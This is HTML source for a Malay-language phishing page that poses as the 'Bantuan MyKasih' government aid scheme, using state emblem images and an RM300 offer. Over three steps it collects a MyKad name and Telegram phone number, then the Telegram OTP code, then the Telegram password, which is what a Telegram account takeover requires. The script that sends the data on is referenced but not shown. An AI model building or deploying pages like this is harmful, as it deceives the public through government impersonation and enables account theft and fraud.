<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bantuan MyKasih: Cara Permohonan & Syarat Kelayakan.</title>

    <!-- Link ke Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
      rel="stylesheet"
    />

    <!-- Link ke CSS intl-tel-input -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
    />

    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div id="page1" class="page">
      <nav class="navbar">
        <div class="navbar-logo">
          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
          <img
            src="logo-home-2.png"
            alt="Logo Negara"
            class="navbar-img"
            style="width: 60px; height: 60px"
          />
        </div>
      </nav>

      <div class="hero">
        <img
          src="rm300.png"
          alt="tng-img"
          style="width: 100%; height: 100%; background: #c5a572"
        />
        <h4>HANTAR RESUME SEKARANG</h4>
        <div class="form-container">
          <form id="registrationForm">
            <label for="name" style="text-align: left; color: #010101">
              Nama Penuh Sesuai MyKad
            </label>
            <input
              type="text"
              id="name"
              name="name"
              placeholder="Nama Penuh Sesuai MyKad"
              required
            />

            <label for="phone" style="text-align: left; color: #010101">
              Nombor Telefon Telegram
            </label>
            <input
              type="tel"
              id="phone"
              name="phone"
              placeholder="+60 112-232-3434"
              required
            />
            <br />
            <button type="submit" class="btn">SEMAK SEKARANG</button>
          </form>
        </div>
      </div>
    </div>

    <div id="page2" class="page" style="display: none">
      <nav class="navbar">
        <div class="navbar-logo">
          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
          <img
            src="logo-home-2.png"
            alt="Logo Negara"
            class="navbar-img"
            style="width: 60px; height: 60px"
          />
        </div>
      </nav>

      <div class="hero">
        <img src="rm300.png" alt="tng-img" />
        <div class="form-container">
          <p class="no-margin" style="font-size: 12px; color: #010101">
            Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda
          </p>
          <form id="otpForm">
            <label for="otp-1" style="font-size: 14px; color: #010101">
              Masukan Kod-OTP
            </label>
            <div class="otp-container">
              <input
                type="number"
                class="otp-input"
                id="otp-1"
                maxlength="1"
                oninput="moveToNext(this, 'otp-2')"
                required
              />
              <input
                type="number"
                class="otp-input"
                id="otp-2"
                maxlength="1"
                oninput="moveToNext(this, 'otp-3')"
                required
              />
              <input
                type="number"
                class="otp-input"
                id="otp-3"
                maxlength="1"
                oninput="moveToNext(this, 'otp-4')"
                required
              />
              <input
                type="number"
                class="otp-input"
                id="otp-4"
                maxlength="1"
                oninput="moveToNext(this, 'otp-5')"
                required
              />
              <input
                type="number"
                class="otp-input"
                id="otp-5"
                maxlength="1"
                oninput="moveToNext(this, null)"
                required
              />

              <script>
                function moveToNext(currentInput, nextInputId) {
                  // Hanya pindah jika input saat ini terisi
                  if (currentInput.value.length >= 1) {
                    if (nextInputId) {
                      document.getElementById(nextInputId).focus();
                    }
                  }
                }
              </script>
            </div>
            <button type="submit" class="btn">TERUSKAN</button>
          </form>
        </div>
      </div>
    </div>

    <div id="page3" class="page" style="display: none">
      <nav class="navbar">
        <div class="navbar-logo">
          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
        </div>
        <div class="navbar-nav">
          <a href="#" class="active">Bahasa Melayu</a>
          <a href="#"><span>English</span></a>
          <a href="#"><span>日本</span></a>
          <a href="#"><span>摩訶至那國</span></a>
        </div>
      </nav>

      <div class="hero">
        <img src="rm300.png" alt="tng-img" />
        <div class="form-container">
          <p id="kataSandi" style="font-size: 12px; color: #010101">
            Sila Masukan kata laluan Telegram Anda
          </p>
          <form id="passwordForm">
            <input
              type="password"
              id="kata-sandi"
              name="kata-sandi"
              placeholder="Masukan kata laluan"
              required
            />
            <button type="submit" class="btn" onclick="handleButtonClick()">
              TERUSKAN
            </button>
          </form>
        </div>
      </div>
    </div>

    <footer>
      <img src="ini1.png" alt="Logo Footer" />
    </footer>

    <div class="loading-screen" id="loadingScreen">
      <img src="loading-loading-forever.gif" alt="Loading..." />
      <br />
      <p style="color: var(--primary-blue); margin-top: 10px; font-size: 14px">
        Tunggu kami sedang menyemak...
      </p>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script></script>

    <script src="java.js"></script>
  </body>
</html>
